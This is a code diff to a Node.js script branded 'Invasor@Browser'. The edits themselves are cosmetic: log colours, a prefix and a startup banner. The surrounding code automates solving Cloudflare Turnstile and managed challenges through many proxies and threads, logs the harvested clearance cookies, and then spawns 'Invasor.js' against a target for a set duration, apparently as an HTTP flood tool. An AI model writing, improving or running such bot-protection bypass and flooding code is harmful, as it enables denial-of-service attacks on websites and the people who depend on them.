@@ -8,40 +8,54 @@ const { exec, spawn } = require("child_process");
 const COOKIES_MAX_RETRIES = 2;
 
 // ────────────────────────────────────────────────
-// Colors & unified logging with [m85|Browser] prefix
+// Colors
 // ────────────────────────────────────────────────
 const c = {
   reset:   "\x1b[0m",
-  bright:  "\x1b[1m",
+  bold:    "\x1b[1m",
+  dim:     "\x1b[2m",
   red:     "\x1b[31m",
   green:   "\x1b[32m",
   yellow:  "\x1b[33m",
   pink:    "\x1b[35m",
   cyan:    "\x1b[36m",
   white:   "\x1b[37m",
+  gray:    "\x1b[90m",
+  orange:  "\x1b[38;2;255;140;50m",
 };
 
-const PREFIX = `${c.bright}${c.cyan}[m85|Browser]${c.reset} `;
+// [Invasor@Browser] prefix - brackets & @ gray, Invasor & Browser deep warm orange
+const PREFIX = `${c.gray}[${c.orange}Invasor${c.gray}@${c.orange}Browser${c.gray}]${c.reset} `;
 
 const symbols = {
-  info:    "→",
-  success: "✓",
-  warn:    "!",
-  error:   "×",
-  proxy:   "→",
+  info:    ">",
+  success: ">",
+  warn:    ">",
+  error:   ">",
+  proxy:   ">",
+  pink:    ">",
 };
 
 function log(type, text) {
-  const symbol = symbols[type] || " ";
+  const symbol = symbols[type] || ">";
   let color = c.white;
 
   if (type === "error") color = c.red;
   if (type === "success") color = c.green;
   if (type === "warn") color = c.yellow;
-  if (type === "info" || type === "proxy") color = c.cyan;
+  if (type === "info" || type === "proxy") color = c.orange;
   if (type === "pink") color = c.pink;
 
   console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
+}
+
+// ────────────────────────────────────────────────
+// Startup banner
+// ────────────────────────────────────────────────
+function showBanner() {
+  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some peace of mind${c.reset}`);
+  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some paradise${c.reset}`);
+  console.log();
 }
 
 const errorHandler = error => log("error", error);
@@ -102,7 +116,8 @@ async function detectChallenge(page, browserProxy) {
     content.includes("cf-challenge-running");
 
   if (isTurnstile || isLegacyChallenge || isManagedChallenge) {
-    log("pink", `Challenge detected → ${browserProxy} [${isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed"}]`);
+    const challengeType = isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed";
+    log("pink", `Detected ${challengeType} challenge → ${browserProxy}`);
     try {
       await sleep(5);
 
@@ -114,7 +129,6 @@ async function detectChallenge(page, browserProxy) {
       if (turnstileFrame) {
         log("info", `Found Turnstile frame → ${browserProxy}`);
         try {
-          // Wait for the checkbox/verify element inside the iframe
           await turnstileFrame.waitForSelector('input[type="checkbox"], .cb-lb, #challenge-stage', { timeout: 15000 });
           const checkbox = await turnstileFrame.$('input[type="checkbox"], .cb-lb');
           if (checkbox) {
@@ -232,8 +246,8 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
       return;
     }
 
-    const cookies = `[ Title ]: ${response.title}\n[ Proxy ]: ${response.browserProxy}\n[ Cookies ]: ${response.cookies}\n`;
-    log("success", cookies);
+    log("success", `Bypassed → ${response.title} | ${response.browserProxy}`);
+    log("success", `Cookies → ${response.cookies}`);
 
     spawn("node", [
       "Invasor.js",
@@ -260,7 +274,11 @@ const queue = async.queue(function (task, done) {
 }, threads);
 
 async function main() {
-  log("info", `Starting with ${proxies.length} proxies, ${threads} threads, ${duration}s duration`);
+  showBanner();
+  log("info", `Starting Browser`);
+  log("info", `Target: ${targetURL}`);
+  log("info", `Proxies: ${proxies.length} | Threads: ${threads} | Duration: ${duration}s`);
+  console.log();
 
   for (const browserProxy of proxies) {
     queue.push({ browserProxy });
